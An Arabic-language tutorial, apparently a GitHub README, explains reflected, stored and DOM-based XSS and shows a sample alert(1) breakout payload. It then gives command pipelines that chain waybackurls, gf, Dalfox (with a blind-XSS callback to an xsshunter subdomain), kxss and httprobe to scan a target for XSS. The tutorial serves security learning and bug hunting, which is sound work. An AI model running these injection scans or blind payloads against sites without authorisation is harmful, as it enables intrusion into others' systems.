# <h1 dir='rtl' align='right'> XSS بالعربي </h1>

## <h2 dir='rtl' align='right'> ** المقدمة ** </h2>

<h2 dir='rtl' align='right'>
  Cross-Site Scripting (XSS) هو نوع من هجمات الحقن, حيث يتم حقن البرامج النصية الضارة في مواقع الويب. هناك ثلاثة أنواع من هجوم XSS
</h2>

<h3 dir='rtl' align='right'> Reflected XSS - النوع المنعكس </h3>

   <p dir='rtl' align='right'> عندك براميتر بيطبع محتواة فى الصفحة فا ممكن تضيف 
  html tags 
  ومنها تقدر تنفذ جافا سكريبت (ٍٍْXSS)
</p>

<h3 dir='rtl' align='right'> Stored XSS - المخزن </h3>

  <p dir='rtl' align='right'>
 reflected الفكرة ببساطة ان البايلود بتاعك بيتم تخزينة على عكس
 فا النوع اعلى من التاني عشان ممكن يتنفذ على اى حد منغير ما تبعت حاجة لى المستخدم زى مكان كومنتس او اسم للمستخدم
</p>

***

<h3 dir='rtl' align='right'> DOM-Based XSS - من داخل كود جافا سكربت </h3>

  <p dir='rtl' align='right'> نوع من XSS يحتوي على حمولات موجودة في DOM بدلاً من كود HTML. </p>

<h3 dir='rt1' align='right'>مثال : عندك الموقع دة وبراميتر بيطبع المحتوى بتاعة فى كود جافاسكريبت زى دة</h3>

```
http://vuln.attack/play.php?parameter=REFLECT
--
var flag_open = '0';
var feedid = '';
var link_url = "REFLECT";
var url_a = 'play.php';
```

فا ممكن تطلع برة وتضيف البايلود بتاعك

```
http://vuln.attack/play.php?parameter=REFLECT";alert(1)//
--
var flag_open = '0';
var feedid = '';
var link_url = "REFLECT";alert(1)//";
var url_a = 'play.php';
```


طبعا فيها اكتر من طريقة والموضوع كبير شوية فا ممكن تلقى نظرة على
[Chrom Dev Tools by Tomnomnom](https://www.youtube.com/watch?v=FTeE3OrTNoA)

وجرب تحل 
Google FireRang XSS

-------------------------------------------------------------------------------------------

<h2 dir='rtl' align='right'>
 ازاي تلاقي XSS بسهولة
</h2>

<h3 dir='rtl' align='right'>
  ايجاد الXSS ببعض ادوات الAutomate
</h3>

<p dir='rtl' align='right'> اولا نستخدم Dalfox, WaybackURL, GF Patterns
اول حاجة هنحتاج نثبت الادوات دي وقبل الادوات اهم شئ انك تثبت لغة البرمجة ذات نفسها الي الادوات دي بتشتغل بيها الا وهي
لغة الGO
</p>

```bash
sudo apt install -y golang
export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
source .bashrc
```

<p dir='rtl' align='right'>
ولو عايز تشو فيديو علي السريع بيشرح تثبت لغة الGO ممكن تشوف الفيديو دا
<a href="https://www.youtube.com/watch?v=69bj8nUlLc8">اضفط هنا</a>
</p>

<h4 dir='rtl' align='right'>DalFox</h4>

<p dir='rtl' align='right'>
بعد كدا هنثبت اول اداة وهي DalFox
لو انت شغال علي اوبونتو يبقا سهل انك تثبتها كدا علي طول من Snap

```bash
$ sudo snap install dalfox
```
</p>

<p dir='rtl' align='right'>
او لو انت ثبت الجو زي مااحنا قولنا يبقا تثبتها كدا علي طول

```bash
go get -u github.com/hahwul/dalfox
```
</p>


<h4 dir='rtl' align='right'> WaybackURLs </h4>

<p dir='rtl' align='right'>
ثاني اداة هتتثبت كدا سهل جدا بعد اما ثبتنا الجو طبعا
</p>

```bash
go get github.com/tomnomnom/waybackurls
```

<h4 dir='rtl' align='right'> GF Patterns </h4>

<p dir='rtl' align='right'>
ثالث اداة بالاحتياجات الخاصة بيها وهي اداة GF
التثبيت بتاعها هكذا جو بردو هنا احنا هنثبت الاداة الاول
</p>

```bash
go get -u github.com/tomnomnom/gf
echo 'source $GOPATH/src/github.com/tomnomnom/gf/gf-completion.bash' >> ~/.bashrc
source ~/.bashrc
```
<p dir='rtl' align='right'>
بعد كدا في شوية Patterns او احتياجات الي هي الاداة هتشتغل بيهم وهنثبتهم كالاتي
اول حاجة هنعمل ملف نحطهم فيه
ثانيا هننفل بعض الPatterns الخاصة بTomnomnom
وهنحمل كمان شوية من ريبو تانية بردو
</p>

```bash
mkdir ~/.gf
cp -r $GOPATH/src/github.com/tomnomnom/gf/examples ~/.gf
cd ~/
git clone https://github.com/1ndianl33t/Gf-Patterns
mv ~/Gf-Patterns/*.json ~/.gf
```

<p dir='rtl' align='right'>
تمام كدا كل الي محتاجينه اتثبت علشان نعمل Automate لبعض الثغرات منهم الي بنتكلم عنها هنا وهي XSS
</p>

<p dir='rtl' align='right'>
هذة بعض الاوامر التي ممكن تستخدمها في الXSS زي ماقولنا
</p>

```bash
echo "target.com"| waybackurls |gf xss |dalfox pipe --blind youusername.xss.ht
```

<p dir='rtl' align='right'>
هنا انصحك تستخدمها في سيشن تانية وافضل انك تستخدمها في tmux tool
وهنا بردو لازم يكون معاك اكونت علي xsshunter
سهل انك تعمل اكونت من هنا
</p>
<p dir='rtl' align='right'>
<a href="https://xsshunter.com/app" >https://xsshunter.com/app </a>
وبعد اما تعمل اكونت غير
youusername.xss.ht
للصب الخاص بيك انت
ثاني طريقة وهي هنستخدم فيها kxss
</p>

### <h3 dir='rtl' align='right'> KXSS - تثبيت </h3>

<p dir='rtl' align='right'>
اول حاجة هنحملها من الجيت هاب هكذا
وهندخل علي الفولدر الي اتحمل دا
وهتلاقي جواه ادوات كثيرة هندخل جوا فولدر
kxss
ونعملها BUILD
وهننقلها للbinary directory
</p>

```bash
git clone https://github.com/tomnomnom/hacks
cd hacks/kxss
go build
cp kxss /usr/bin
```
<p dir='rtl' align='right'>
خلاص كدا ثبتناها ندخل بقا علي الكوماند الجاي وهو هنعمل بيه Automate لاننا نلاقي RXSS من خلال الادوات الي فات بردو بس بردون DalFox
</p>

```bash
echo 'target.com'| waybackurls | grep -v "png\|jpg\|css\|js\|gif\|txt\|pdf" | grep "="|httprobe |kxss|tee kxss.txt
```

<p dir='rtl' align='right'>
اداة httprobe هتلاقيها هنا </a href="https://github.com/tomnomnom/httprobe">https://github.com/tomnomnom/httprobe</a><br>
وبعد اما تشغل الكوماند الي فوق هيجرب بعض الcharcters في البرامترز ولو لقي في برامتر بيقبلهم هيقولك وفي الاخر هيحفظهملك في file
</p>

## <h2 dir='rtl' align='right'>اخيرا</h2>

<p dir='rtl' align='right'>
 واخرا وليس اخرا هنقف لهنا لو عندك اي اضافة اعمل pull request وضيفها وبردو انا شغال لو في حاجة جديدة هضيفها باذن الله
</p>

<p dir='rtl' align='right'>
وهنا هتلاقي في بعض الملفات هتفيدك في بعض الانواع المختلفة من الXSS
</p>

<p style='font-size:"50px;"' dir='rtl' align='right'>
 <a href="XSS\Files">Files</a><br>
 Payload ليستة <br>
 <a href="XSS\xsspayloads.txt">xsspayloads.txt</a>
</p>
